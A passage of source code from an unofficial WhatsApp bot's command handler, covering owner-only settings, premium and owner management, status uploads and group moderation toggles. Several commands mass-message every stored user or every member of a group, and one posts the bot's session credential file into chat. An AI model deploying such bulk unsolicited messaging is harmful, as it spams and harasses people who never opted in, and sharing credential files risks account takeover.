          db.data.users = [];
        }
        break;
      case "resethit":
      case "resettotalhit":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          global.db.data.settings[botNumber].totalhit = 0;
          replygcXlicon(mess.done);
        }
        break;
      case "setmenu":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!text)
            return replygcXlicon(
              `*_There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)_*\n*_Please select one\nExample ${
                prefix + command
              } v1_*`
            );
          if (text.startsWith("v")) {
            typemenu = text;
            replygcXlicon(mess.done);
          } else {
            replygcXlicon(
              `*_There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)_*\n*_Please select one\nExample ${
                prefix + command
              } v1_*`
            );
          }
        }
        break;
      case "setreply":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!text)
            return replygcXlicon(
              `*_There are 3 reply(v1,v2,v3)_*\n*_Please select 1\nExample ${
                prefix + command
              } v1_*`
            );
          if (text.startsWith("v")) {
            typereply = text;
            replygcXlicon(mess.done);
          } else {
            replygcXlicon(
              `*_There are 3 reply(v1,v2,v3)_*\n*_Please select 1\nExample ${
                prefix + command
              } v1_*`
            );
          }
        }
        break;
      case "statustext":
      case "upswteks":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!q) return replygcXlicon("*_Text?_*");
          await XliconBotInc.sendMessage(
            "status@broadcast",
            { text: q },
            {
              backgroundColor: "#FF000000",
              font: 3,
              statusJidList: Object.keys(global.db.data.users),
            }
          );
          replygcXlicon(mess.done);
        }
        break;
      case "statusvideo":
      case "upswvideo":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (/video/.test(mime)) {
            var videosw = await XliconBotInc.downloadAndSaveMediaMessage(
              quoted
            );
            await XliconBotInc.sendMessage(
              "status@broadcast",
              {
                video: {
                  url: videosw,
                },
                caption: q ? q : "",
              },
              { statusJidList: Object.keys(global.db.data.users) }
            );
            await replygcXlicon(mess.done);
          } else {
            replygcXlicon("*_Reply to video_*");
          }
        }
        break;
      case "statusimg":
      case "statusimage":
      case "upswimg":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (/image/.test(mime)) {
            var imagesw = await XliconBotInc.downloadAndSaveMediaMessage(
              quoted
            );
            await XliconBotInc.sendMessage(
              "status@broadcast",
              {
                image: {
                  url: imagesw,
                },
                caption: q ? q : "",
              },
              { statusJidList: Object.keys(global.db.data.users) }
            );
            await replygcXlicon(mess.done);
          } else {
            replygcXlicon("*_Reply to image_*");
          }
        }
        break;
      case "statusaudio":
      case "upswaudio":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (/audio/.test(mime)) {
            var audiosw = await XliconBotInc.downloadAndSaveMediaMessage(
              quoted
            );
            await XliconBotInc.sendMessage(
              "status@broadcast",
              {
                audio: {
                  url: audiosw,
                },
                mimetype: "audio/mp4",
                ptt: true,
              },
              {
                backgroundColor: "#FF000000",
                statusJidList: Object.keys(global.db.data.users),
              }
            );
            await replygcXlicon(mess.done);
          } else {
            replygcXlicon("*_Reply to audio_*");
          }
        }
        break;
      case "setimgmenu":
      case "sim":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          await fsx.copy(delb, "./XliconMedia/theme/xliconpic.jpg");
          fs.unlinkSync(delb);
          replygcXlicon(mess.done);
        }
        break;
      case "setvidmenu":
      case "svm":
      case "setvgifmenu":
      case "sgm":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          let delb = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          await fsx.copy(delb, "./XliconMedia/theme/xliconvid.mp4");
          fs.unlinkSync(delb);
          replygcXlicon(mess.done);
        }
        break;
      case "addtitle":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!text)
            return replygcXlicon(`*_Usage ${prefix + command} number|title_*`);
          nonya = text.split("|")[0];
          titlenya = text.split("|")[1];
          let oo = `${nonya}@s.whatsapp.net`;
          db.data.users[oo].title = titlenya;
          await replygcXlicon(mess.done);
        }
        break;
      case "deltitle":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!text)
            return replygcXlicon(`*_Usage ${prefix + command} number_*`);
          nonya = text.split(",")[0];
          let oo = `${nonya}@s.whatsapp.net`;
          db.data.users[oo].title = "";
          await replygcXlicon(mess.done);
        }
        break;
      case "addlimit":
      case "givelimit":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!text)
            return replygcXlicon(
              `*_Usage ${prefix + command} number|limit amount_*`
            );
          usernya = text.split("|")[0];
          limitnya = text.split("|")[1];
          let oo = `${usernya}@s.whatsapp.net`;
          db.data.users[oo].limit += limitnya;
          replygcXlicon(mess.done);
        }
        break;
      case "dellimit":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!text)
            return replygcXlicon(
              `*_Usage ${prefix + command} number|limit amount_*`
            );
          usernya = text.split("|")[0];
          limitnya = text.split("|")[1];
          if (db.data.users[usernya + "@s.whatsapp.net"].limit < limitnya)
            return replygcXlicon(`*_His Limit Is Less Than ${limitnya}_*`);
          db.data.users[usernya + "@s.whatsapp.net"].limit -= limitnya;
          replygcXlicon(mess.done);
        }
        break;
      case "addprem":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 2)
          return replygcXlicon(
            `*_Usage ${prefix + command} @tag time\n${
              prefix + command
            } number time\n\nExample : ${prefix + command} @tag 30d_*`
          );
        if (m.mentionedJid.length !== 0) {
          for (let i = 0; i < m.mentionedJid.length; i++) {
            addPremiumUser(m.mentionedJid[0], args[1], premium);
          }
          replygcXlicon("*_Premium Success_*");
        } else {
          addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
          replygcXlicon("*_Premium Success_*");
        }
        break;
      case "delprem":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(
            `*_Usage ${prefix + command} @tag\n${
              prefix + command
            } number\n\nExample : ${prefix + command} 916909137213_*`
          );
        if (m.mentionedJid.length !== 0) {
          for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync(
              "./src/data/role/premium.json",
              JSON.stringify(premium)
            );
          }
          replygcXlicon("*_Delete Success_*");
        } else {
          premium.splice(
            getPremiumPosition(args[0] + "@s.whatsapp.net", premium),
            1
          );
          fs.writeFileSync(
            "./src/data/role/premium.json",
            JSON.stringify(premium)
          );
          replygcXlicon("*_Delete Success_*");
        }
        break;
      case "listprem":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          let data = require("./src/data/role/premium.json");
          let txt = `*------「 LIST PREMIUM 」------*\n\n`;
          for (let x of data) {
            txt += `Number : ${x.id}\n`;
            txt += `Expire In: ${x.expired} ms\n`;
            XliconBotInc.sendMessage(
              m.chat,
              {
                text: txt,
                mentions: x,
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "addowner":
        if (!XeonTheCreator) return XliconStickOwner();
        if (!args[0])
          return replygcXlicon(
            `*_Use ${prefix + command} number\nExample ${
              prefix + command
            } ${ownernumber}_*`
          );
        bnnd = q.split("|")[0].replace(/[^0-9]/g, "");
        let ceknye = await XliconBotInc.onWhatsApp(bnnd);
        if (ceknye.length == 0)
          return replygcXlicon(
            `*_Enter A Valid And Registered Number On WhatsApp!!!_*`
          );
        owner.push(bnnd);
        fs.writeFileSync("./src/data/role/owner.json", JSON.stringify(owner));
        replygcXlicon(`*_Number ${bnnd} Has Become An Owner!!!_*`);
        break;
      case "delowner":
        if (!XeonTheCreator) return XliconStickOwner();
        if (!args[0])
          return replygcXlicon(
            `*_Use ${prefix + command} nomor\nExample ${
              prefix + command
            } 916909137213_*`
          );
        ya = q.split("|")[0].replace(/[^0-9]/g, "");
        unp = owner.indexOf(ya);
        owner.splice(unp, 1);
        fs.writeFileSync("./src/data/role/owner.json", JSON.stringify(owner));
        replygcXlicon(
          `*_The Numbrr ${ya} Has been deleted from owner list by the owner!!!_*`
        );
        break;
      case "listowner":
        {
          let teks = "┌──⭓「 *List Owner* 」\n│\n";
          for (let x of owner) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`;
          replygcXlicon(teks);
        }
        break;
      case "delsession":
      case "clearsession":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          fs.readdir("./session", async function (err, files) {
            if (err) {
              console.log("Unable to scan directory: " + err);
              return replygcXlicon("Unable to scan directory: " + err);
            }
            let filteredArray = await files.filter(
              (item) =>
                item.startsWith("pre-key") ||
                item.startsWith("sender-key") ||
                item.startsWith("session-") ||
                item.startsWith("app-state")
            );
            console.log(filteredArray.length);
            let teks = `Detected ${filteredArray.length} junk files\n\n`;
            if (filteredArray.length == 0) return replygcXlicon(teks);
            filteredArray.map(function (e, i) {
              teks += i + 1 + `. ${e}\n`;
            });
            replygcXlicon(teks);
            await sleep(2000);
            replygcXlicon("*_Deleting junk files..._*");
            await filteredArray.forEach(function (file) {
              fs.unlinkSync(`./session/${file}`);
            });
            await sleep(2000);
            replygcXlicon(
              "*_Successfully deleted all the trash in the session folder_*"
            );
          });
        }
        break;
      case "join":
        try {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!text) return replygcXlicon("*_Enter Group Link!_*");
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return replygcXlicon("*_Link Invalid!_*");
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          XliconBotInc.groupAcceptInvite(result);
          await replygcXlicon(`*_Done_*`);
        } catch {
          replygcXlicon("*_Failed to join the Group_*");
        }
        break;
      case "getsession":
        if (!XeonTheCreator) return XliconStickOwner();
        replygcXlicon(
          "*_Wait a moment, currently retrieving your session file_*"
        );
        let sesi = fs.readFileSync("./session/creds.json");
        XliconBotInc.sendMessage(
          m.chat,
          {
            document: sesi,
            mimetype: "application/json",
            fileName: "creds.json",
          },
          {
            quoted: m,
          }
        );
        break;
      case "myip":
      case "ipbot":
        if (!XeonTheCreator) return XliconStickOwner();
        var http = require("http");
        http.get(
          {
            host: "api.ipify.org",
            port: 80,
            path: "/",
          },
          function (resp) {
            resp.on("data", function (ip) {
              replygcXlicon("🔎 My public IP address is: " + ip);
            });
          }
        );
        break;
      case "request":
      case "reportbug":
        {
          if (!text)
            return replygcXlicon(
              `Example : ${prefix + command} hi dev play command is not working`
            );
          textt = `*| REQUEST/BUG |*`;
          teks1 = `\n\n*User* : @${
            m.sender.split("@")[0]
          }\n*Request/Bug* : ${text}`;
          teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`;
          for (let i of owner) {
            XliconBotInc.sendMessage(
              i + "@s.whatsapp.net",
              {
                text: textt + teks1,
                mentions: [m.sender],
              },
              {
                quoted: m,
              }
            );
          }
          XliconBotInc.sendMessage(
            m.chat,
            {
              text: textt + teks2 + teks1,
              mentions: [m.sender],
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "shutdown":
        if (!XeonTheCreator) return XliconStickOwner();
        replygcXlicon(`*_Restarting will be completed in seconds_*`);
        await sleep(3000);
        process.exit();
        break;
      case "autoread":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} on/off_*`);
        if (q === "on") {
          db.data.settings[botNumber].autoread = true;
          replygcXlicon(`*_Successfully changed autoread to ${q}_*`);
        } else if (q === "off") {
          db.data.settings[botNumber].autoread = false;
          replygcXlicon(`*_Successfully changed autoread to ${q}_*`);
        }
        break;
      case "unavailable":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} on/off_*`);
        if (q === "on") {
          db.data.settings[botNumber].online = true;
          replygcXlicon(`*_Successfully changed unavailable to ${q}_*`);
        } else if (q === "off") {
          db.data.settings[botNumber].online = false;
          replygcXlicon(`*_Successfully changed unavailable to ${q}_*`);
        }
        break;
      case "autorecordtype":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} on/off_*`);
        if (q === "on") {
          db.data.settings[botNumber].autorecordtype = true;
          replygcXlicon(
            `*_Successfully changed Auto-RecordingTyping to ${q}_*`
          );
        } else if (q === "off") {
          db.data.settings[botNumber].autorecordtype = false;
          replygcXlicon(
            `*_Successfully changed Auto-RecordingTyping to ${q}_*`
          );
        }
        break;
      case "autorecord":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} on/off_*`);
        if (q === "on") {
          db.data.settings[botNumber].autorecord = true;
          replygcXlicon(`*_Successfully changed Auto-Recording to ${q}_*`);
        } else if (q === "off") {
          db.data.settings[botNumber].autorecord = false;
          replygcXlicon(`*_Successfully changed Auto-Recording to ${q}_*`);
        }
        break;
      case "autotype":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} on/off_*`);
        if (q === "on") {
          db.data.settings[botNumber].autotype = true;
          replygcXlicon(`*_Successfully changed Auto-Typing to ${q}_*`);
        } else if (q === "off") {
          db.data.settings[botNumber].autotype = false;
          replygcXlicon(`*_Successfully changed Auto-Typing to ${q}_*`);
        }
        break;
      case "autobio":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} on/off_*`);
        if (q == "on") {
          db.data.settings[botNumber].autobio = true;
          replygcXlicon(`*_Successfully Changed AutoBio To ${q}_*`);
        } else if (q == "off") {
          db.data.settings[botNumber].autobio = false;
          replygcXlicon(`*_Successfully Changed AutoBio To ${q}_*`);
        }
        break;
      case "autosticker":
      case "autostickergc":
        if (!m.isGroup) return XeonStickGroup();
        if (!isBotAdmins) return XliconStickBotAdmin();
        if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} on/off_*`);
        if (q == "on") {
          db.data.settings[botNumber].autosticker = true;
          replygcXlicon(`*_Successfully Changed AutoBio To ${q}_*`);
        } else if (q == "off") {
          db.data.settings[botNumber].autosticker = false;
          replygcXlicon(`*_Successfully Changed AutoBio To ${q}_*`);
        }
        break;
      case "autoblock":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} on/off_*`);
        if (q == "on") {
          db.data.settings[botNumber].autoblocknum = true;
          replygcXlicon(`*_Successfully Changed Auto-Block To ${q}_*`);
        } else if (q == "off") {
          db.data.settings[botNumber].autoblocknum = false;
          replygcXlicon(`*_Successfully Changed Auto-Block To ${q}_*`);
        }
        break;
      case "onlygroup":
      case "onlygc":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} on/off_*`);
        if (q == "on") {
          db.data.settings[botNumber].onlygrub = true;
          replygcXlicon(`*_Successfully Changed Onlygroup To ${q}_*`);
        } else if (q == "off") {
          db.data.settings[botNumber].onlygrub = false;
          replygcXlicon(`*_Successfully Changed Onlygroup To ${q}_*`);
        }
        break;
      case "onlyprivatechat":
      case "onlypc":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} on/off_*`);
        if (q == "on") {
          db.data.settings[botNumber].onlypc = true;
          replygcXlicon(`*_Successfully Changed Only-Pc To ${q}_*`);
        } else if (q == "off") {
          db.data.settings[botNumber].onlypc = false;
          replygcXlicon(`*_Successfully Changed Only-Pc To ${q}_*`);
        }
        break;
      case "onlyindia":
      case "onlyindianumber":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} on/off_*`);
        if (q == "on") {
          db.data.settings[botNumber].onlyindia = true;
          replygcXlicon(`*_Successfully Changed Only-Indian To ${q}_*`);
        } else if (q == "off") {
          db.data.settings[botNumber].onlyindia = false;
          replygcXlicon(`*_Successfully Changed Only-Indian To ${q}_*`);
        }
        break;
      case "onlyindo":
      case "onlyindonumber":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} on/off_*`);
        if (q == "on") {
          db.data.settings[botNumber].onlyindo = true;
          replygcXlicon(`*_Successfully Changed Only-Indonesian To ${q}_*`);
        } else if (q == "off") {
          db.data.settings[botNumber].onlyindo = false;
          replygcXlicon(`*_Successfully Changed Only-Indonesian To ${q}_*`);
        }
        break;
      case "self":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          XliconBotInc.public = false;
          replygcXlicon("*Successful in Changing To Self Usage*");
        }
        break;
      case "public":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          XliconBotInc.public = true;
          replygcXlicon("*Successful in Changing To Public Usage*");
        }
        break;
      case "mode":
        if (!XeonTheCreator) return XliconStickOwner();
        if (args.length < 1)
          return replygcXlicon(`*_Example ${prefix + command} public/self_*`);
        if (q == "public") {
          XliconBotInc.public = true;
          replygcXlicon(mess.done);
        } else if (q == "self") {
          XliconBotInc.public = false;
          replygcXlicon(mess.done);
        }
        break;
      case "setexif":
      case "setwm":
        if (!XeonTheCreator) return XliconStickOwner();
        if (!text)
          return replygcXlicon(
            `*_Example : ${prefix + command} packname|author_*`
          );
        global.packname = text.split("|")[0];
        global.author = text.split("|")[1];
        replygcXlicon(
          `*_Exif successfully changed to\n\n• Packname : ${global.packname}\_*n• Author : ${global.author}`
        );
        break;
      case "setprefix":
        if (!XeonTheCreator) return XliconStickOwner();
        if (!text)
          return replygcXlicon(
            `*_Example : ${prefix + command} packname|author_*`
          );
        global.xprefix = text;
        replygcXlicon(`*_Prefix successfully changed to ${text}_*`);
        break;
      case "setautoblock":
        if (!XeonTheCreator) return XliconStickOwner();
        if (!text)
          return replygcXlicon(
            `*_Example : ${prefix + command} packname|author_*`
          );
        global.autoblocknumber = text;
        replygcXlicon(`*_Auto-Block number successfully changed to ${text}_*`);
        break;
      case "setantiforeign":
        if (!XeonTheCreator) return XliconStickOwner();
        if (!text)
          return replygcXlicon(
            `*_Example : ${prefix + command} packname|author_*`
          );
        global.antiforeignnumber = text;
        replygcXlicon(`Anti-foreign number successfully changed to ${text}`);
        break;
      case "setbotpp":
      case "setpp":
      case "setpp":
      case "setppbot":
        if (!XeonTheCreator) return XliconStickOwner();
        if (!quoted)
          return replygcXlicon(
            `*_Send/Reply Image With Caption ${prefix + command}_*`
          );
        if (!/image/.test(mime))
          return replygcXlicon(
            `*_Send/Reply Image With Caption ${prefix + command}_*`
          );
        if (/webp/.test(mime))
          return replygcXlicon(
            `*_Send/Reply Image With Caption ${prefix + command}_*`
          );
        var medis = await XliconBotInc.downloadAndSaveMediaMessage(
          quoted,
          "ppbot.jpeg"
        );
        if (args[0] == "full") {
          var { img } = await generateProfilePicture(medis);
          await XliconBotInc.query({
            tag: "iq",
            attrs: {
              to: botNumber,
              type: "set",
              xmlns: "w:profile:picture",
            },
            content: [
              {
                tag: "picture",
                attrs: {
                  type: "image",
                },
                content: img,
              },
            ],
          });
          fs.unlinkSync(medis);
          replygcXlicon(mess.done);
        } else {
          var memeg = await XliconBotInc.updateProfilePicture(botNumber, {
            url: medis,
          });
          fs.unlinkSync(medis);
          replygcXlicon(mess.done);
        }
        break;
      case "leave":
      case "out":
        if (!XeonTheCreator) return XliconStickOwner();
        if (!m.isGroup) return XeonStickGroup();
        replygcXlicon("*_Bye Everyone 🥺_*");
        await XliconBotInc.groupLeave(m.chat);
        break;
      case "bc":
      case "broadcast":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!text) return replygcXlicon("*_Text?_*");
          let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`;
          for (let i of Object.keys(global.db.data.users)) {
            await sleep(1500);
            if (/image/.test(mime)) {
              var media = await quoted.download();
              await XliconBotInc.sendMessage(i, {
                image: media,
                caption: teksnya,
              });
            } else if (/video/.test(mime)) {
              var media = await quoted.download();
              await XliconBotInc.sendMessage(i, {
                video: media,
                caption: teksnya,
              });
            } else if (text) {
              await XliconBotInc.sendMessage(i, {
                text: teksnya,
              });
            }
          }
          replygcXlicon(
            `*_Success ${command} To ${
              Object.keys(global.db.data.users).length
            } Users_*`
          );
        }
        break;
      case "pushcontact":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!m.isGroup)
            return replygcXlicon(`*_The feature works only in grup_*`);
          if (!text) return replygcXlicon(`*_text?_*`);
          let mem = await participants
            .filter((v) => v.id.endsWith(".net"))
            .map((v) => v.id);
          replygcXlicon(`*_Success in pushing the message to contacts_*`);
          for (let pler of mem) {
            XliconBotInc.sendMessage(pler, { text: q });
          }
          replygcXlicon(`*_Done_*`);
        }
        break;
      case "pushcontactv2":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!q)
            return replygcXlicon(
              `*_Incorrect Usage Please Use Command Like This\n${
                prefix + command
              } idgc|text_*`
            );
          await XliconStickWait();
          const metadata2 = await XliconBotInc.groupMetadata(q.split("|")[0]);
          const halss = metadata2.participants;
          for (let mem of halss) {
            XliconBotInc.sendMessage(
              `${mem.id.split("@")[0]}` + "@s.whatsapp.net",
              { text: q.split("|")[1] }
            );
            await sleep(5000);
          }
          replygcXlicon(`*_Success_*`);
        }
        break;
      case "block":
      case "ban":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await XliconBotInc.updateBlockStatus(users, "block");
          await replygcXlicon(`*_Done_*`);
        }
        break;
      case "unblock":
      case "unban":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await XliconBotInc.updateBlockStatus(users, "unblock");
          await replygcXlicon(`*_Done_*`);
        }
        break;
      case "bcgc":
      case "bcgroup":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!text)
            return replygcXlicon(
              `*_Text mana?_*\n\nExample : ${prefix + command} Besok Libur `
            );
          let getGroups = await XliconBotInc.groupFetchAllParticipating();
          let groups = Object.entries(getGroups)
            .slice(0)
            .map((entry) => entry[1]);
          let anu = groups.map((v) => v.id);
          replygcXlicon(
            `*_Sending Broadcast To ${anu.length} Group Chat, End Time ${
              anu.length * 1.5
            } seconds_*`
          );
          for (let i of anu) {
            await sleep(1500);
            let a =
              `${ownername}'s Broadcast\n\n` +
              "```" +
              `Message: ${text}\n\n` +
              "```";
            XliconBotInc.sendMessage(i, {
              text: a,
              contextInfo: {
                externalAdReply: {
                  showAdAttribution: true,
                  title: botname,
                  body: `Sent in ${i.length} Group`,
                  thumbnailUrl: "https://i.ibb.co/c8JJBZZ/peakpx-2.jpg",
                  sourceUrl: wagc,
                  mediaType: 1,
                  renderLargerThumbnail: true,
                },
              },
            });
          }
          replygcXlicon(
            `*_Successful in sending Broadcast To ${anu.length} Group_*`
          );
        }
        break;
      case "getcase":
        if (!XeonTheCreator) return XliconStickOwner();
        try {
          const getCase = (cases) => {
            return (
              "case" +
              `'${cases}'` +
              fs
                .readFileSync("XLICON-V3.js")
                .toString()
                .split("case '" + cases + "'")[1]
                .split("break")[0] +
              "break"
            );
          };
          replygcXlicon(`${getCase(q)}`);
        } catch {
          replygcXlicon(`case ${q} not found!`);
        }
        break;
      //group
      case "antibadword":
      case "antitoxic":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].badword = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].badword = false;
            replygcXlicon(`${commad} is disabled`);
          }
        }
        break;
      case "react":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          reactionMessage = {
            react: {
              text: args[0],
              key: { remoteJid: m.chat, fromMe: true, id: quoted.id },
            },
          };
          XliconBotInc.sendMessage(m.chat, reactionMessage);
        }
        break;
      case "nsfw":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args[0] === "on") {
            if (AntiNsfw) return replygcXlicon("*_Already activated_*");
            ntnsfw.push(from);
            fs.writeFileSync(
              "./src/data/function/nsfw.json",
              JSON.stringify(ntnsfw)
            );
            replygcXlicon("*_Success in turning on nsfw in this group_*");
            var groupe = await XliconBotInc.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            XliconBotInc.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiNsfw) return replygcXlicon("*_Already deactivated_*");
            let off = ntnsfw.indexOf(from);
            ntnsfw.splice(off, 1);
            fs.writeFileSync(
              "./src/data/function/nsfw.json",
              JSON.stringify(ntnsfw)
            );
            replygcXlicon("*_Success in turning off nsfw in this group_*");
          } else {
            await replygcXlicon(
              `*_Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable_*`
            );
          }
        }
        break;
      case "id":
        {
          replygcXlicon(from);
        }
        break;
      case "antiaudio":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antiaudio = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antiaudio = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "antiforeign":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[m.chat].antiforeignnum = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[m.chat].antiforeignnum = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "poll":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          let [poll, opt] = text.split("|");
          if (text.split("|") < 2)
            return await replygcXlicon(
              `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
            );
          let options = [];
          for (let i of opt.split(",")) {
            options.push(i);
          }
          await XliconBotInc.sendMessage(m.chat, {
            poll: {
              name: poll,
              values: options,
            },
          });
        }
        break;
      case "antipoll":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antipoll = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antipoll = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "antisticker":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antisticker = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antisticker = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "antiimage":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antiimage = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antiimage = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "antivideo":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antivideo = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antivideo = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "antivirtex":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antivirtex = true;
            replygcXlicon(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antivirtex = false;
            replygcXlicon(`${command} is disabled`);
          }
        }
        break;
      case "antibot":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!isBotAdmins) return XliconStickBotAdmin();
          if (!isAdmins && !XeonTheCreator) return XliconStickAdmin();
          if (args.length < 1) return replygcXlicon("*_on/off?_*");
          if (args[0] === "on") {
            db.data.chats[from].antibot = true;
